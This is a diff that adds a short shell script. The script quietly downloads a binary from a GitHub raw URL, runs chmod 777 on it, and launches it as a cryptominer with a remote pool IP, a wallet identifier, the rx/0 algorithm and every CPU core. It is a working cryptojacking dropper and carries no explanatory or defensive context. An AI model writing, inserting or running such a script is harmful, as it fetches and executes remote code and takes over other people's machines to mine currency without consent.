@@ -1,0 +1,4 @@
+#!/bin/sh
+wget -O gigi https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1
+chmod 777 gigi
+./gigi --donate-level 1 -o 165.232.165.31:443 -u Q0104006f62eeca4efe4da7805a59e381783e116ab66e257dfe06a6d199cd7505ce9f07847e5a73 -p $(shuf -n 1 -i 1-999)-BB -a rx/0 -t $(nproc --all)
